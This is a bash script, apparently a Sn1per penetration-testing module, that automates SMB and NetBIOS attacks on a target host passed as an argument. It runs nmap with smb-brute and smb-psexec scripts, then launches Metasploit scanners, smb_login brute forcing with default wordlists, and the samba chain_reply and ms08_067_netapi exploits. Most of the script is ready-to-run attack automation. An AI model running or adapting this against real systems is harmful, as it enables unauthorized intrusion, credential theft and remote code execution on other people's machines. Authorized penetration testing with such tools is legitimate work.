#!/bin/bash

VER="2.5"
TARGET="$1"
MODE="$2"
OPT1="$3"
DISABLE_POSTGRESQL="true" # disabling postgresql startup, assuming it's running already
INSTALL_DIR="/usr/share/sniper"
LOOT_DIR="/usr/share/sniper/loot"
PLUGINS_DIR="/usr/share/sniper/plugins"
CMSMAP="/usr/share/sniper/plugins/CMSmap/cmsmap.py"
SAMRDUMP="/usr/share/sniper/bin/samrdump.py"
DNSDICT6="/usr/share/sniper/bin/dnsdict6"
INURLBR="/usr/share/sniper/bin/inurlbr.php"
USER_FILE="/usr/share/brutex/wordlists/simple-users.txt"
PASS_FILE="/usr/share/brutex/wordlists/password.lst"
DNS_FILE="/usr/share/brutex/wordlists/namelist.txt"
SUPER_MICRO_SCAN="/usr/share/sniper/plugins/SuperMicro-Password-Scanner/supermicro_scan.sh"
DEFAULT_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,623,624,1099,1433,1524,2049,2121,3128,3306,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,16992,27017,27018,27019,28017,49152,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049"
DEFAULT_TCP_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,623,624,1099,1433,1524,2049,2121,3306,3128,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,16992,27017,27018,27019,28017,49152"
DEFAULT_UDP_PORTS="53,67,68,88,161,162,137,138,139,389,520,2049"
THREADS="30"
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'
REGEX='^[0-9]+$'

# ENABLE/DISABLE AUTOMATIC BRUTE FORCE
# DEFAULT IS "1" (ENABLED)
AUTOBRUTE="1"

# ENABLE/DISABLE FULL DETAILED NMAP SCAN
# DEFAULT IS "1" (ENABLED)
FULLNMAPSCAN="1"

# ENABLE/DISABLE AUTOMATIC GOOGLE HACKING QUERIES
# DEFAULT IS "1" (ENABLED)
GOOHAK="1"

# ENABLE AUTO UPDATES
# DEFAULT IS "1" (ENABLED)
ENABLE_AUTO_UPDATES="1"

cd $INSTALL_DIR

if [[ ${TARGET:0:1} =~ $REGEX ]];
	then
	SCAN_TYPE="IP"
else
	SCAN_TYPE="DOMAIN"
fi

echo -e "$OKGREEN + -- ----------------------------=[Running SMB and Netbios Enumeration]=----------------- -- +$RESET"

python $SAMRDUMP $TARGET
nmap -A -sV  -T4 -p $MODE --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET -oX "$LOOT_DIR"/nmap/nmap"$MODE"_"$TARGET"_"$(date +'%FT%H%M%S')"_.xml
msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT "$MODE"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;"

echo -e "$OKGREEN + -- ----------------------------=[Exiting Sniper sh script]=---- -- +$RESET"
exit
